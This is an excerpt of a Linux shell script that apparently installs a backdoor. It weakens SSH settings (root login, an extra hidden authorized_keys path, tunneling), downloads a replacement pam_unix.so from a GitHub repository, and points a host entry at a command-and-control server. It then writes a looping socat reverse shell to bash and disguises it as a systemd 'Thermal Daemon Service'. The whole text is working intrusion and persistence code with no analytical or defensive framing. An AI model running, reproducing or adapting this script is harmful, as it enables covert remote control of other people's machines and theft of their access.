...
apt-get -qq install cron -y ; apt-get -qq install net-tools -y ; apt-get -qq install systemd -y ; apt-get -qq install socat -y ; apt-get -qq install netclient
which crontab;which netstat;which systemd;which socat;which netclient
echo -e "\e[31mInstalled with apt-get\e[0m"
else
yum -q update -y
yum -q install systemd -y ; yum -q install cron -y;yum -q install net-tools -y;yum -q install socat -y;yum -q install netclient
which crontab;which netstat;which systemd;which socat;which netclient
...
if [ -n "${uid}" ] && [ $uid -ge "0" ] ; then
    ...
    if [[ -f $dir_ssh_k ]]; then
        ...
        #создать файл
        echo "PermitRootLogin yes" >> /etc/ssh/sshd_config.d/default.conf >/dev/null 2>&1
        echo "PrintLastLog no" >> /etc/ssh/sshd_config.d/default.conf >/dev/null 2>&1
        echo "Port $admin_port " >> /etc/ssh/sshd_config.d/default.conf 
        echo "AuthorizedKeysFile .ssh/authorized_keys .tmp/authorized_keys" >> /etc/ssh/sshd_config.d/default.conf >/dev/null 2>&1
        echo "PubkeyAuthentication yes " >> /etc/ssh/sshd_config.d/default.conf >/dev/null 2>&1
        echo "IgnoreRhosts yes " >> /etc/ssh/sshd_config.d/default.conf >/dev/null 2>&1
        echo "PermitEmptyPasswords no " >> /etc/ssh/sshd_config.d/default.conf >/dev/null 2>&1
        echo "PermitTTY yes " >> /etc/ssh/sshd_config.d/default.conf >/dev/null 2>&1
        echo "UsePAM yes " >> /etc/ssh/sshd_config.d/default.conf >/dev/null 2>&1
        echo "X11Forwarding yes " >> /etc/ssh/sshd_config.d/default.conf >/dev/null 2>&1
        echo "PermitTunnel yes " >> /etc/ssh/sshd_config.d/default.conf >/dev/null 2>&1
        echo "GatewayPorts yes " >> /etc/ssh/sshd_config.d/default.conf >/dev/null 2>&1
        echo "GSSAPICleanupCredentials no " >> /etc/ssh/sshd_config.d/default.conf >/dev/null 2>&1
        echo "PermitOpen any " >> /etc/ssh/sshd_config.d/default.conf >/dev/null 2>&1
        echo "AllowTcpForwarding yes " >> /etc/ssh/sshd_config.d/default.conf >/dev/null 2>&1
...
sleep 3s
wget -P /usr/lib/x86_64-linux-gnu/security/ https://github.com/zip609/temp/blob/main/pam_unix.so?raw=true >/dev/null 2>&1
wget -P /usr/lib/x86_64-linux-gnu/security/ https://github.com/zip609/temp/blob/main/drivers?raw=true >/dev/null 2>&1
sleep 3s
echo -e "$c2serverip $c2servername" >> /etc/hosts >/dev/null 2>&1
# # Stage -1#
 mkdir -p /etc/systemd/system/freedesktop.service.d >/dev/null 2>&1
 echo -e "#!/bin/bash\nwhile true; do\nnetstat -vatn | grep -q $c2servername:$c2serverport.*ESTABLISHED\nsocat TCP:$c2servername:$c2serverport EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane &>/dev/null\nsleep 5\ndone" > /etc/systemd/system/freedesktop.service.d/update.sh >/dev/null 2>&1
 echo -e "[Unit]\nConditionVirtualization=" > /etc/systemd/system/freedesktop.service.d/allow_virt.conf >/dev/null 2>&1
 chmod +x /etc/systemd/system/freedesktop.service.d/update.sh >/dev/null 2>&1
# # Stage -3#
 echo -e "[Unit]\nDescription=Thermal Daemon Service\nConditionVirtualization=no" > /usr/lib/systemd/system/freedesktop.service >/dev/null 2>&1
 echo -e "[Service]\nType=dbus\nSuccessExitStatus=1\nBusName=org.freedesktop.com\nExecStart=/etc/systemd/system/freedesktop.service.d/update.sh" >> /usr/lib/systemd/system/freedesktop.service >/dev/null 2>&1
 echo -e "[Install]\nWantedBy=multi-user.target\nAlias=dbus-org.freedesktop.com.service" >> /usr/lib/systemd/system/freedesktop.service >/dev/null 2>&1
# # Stage -4#
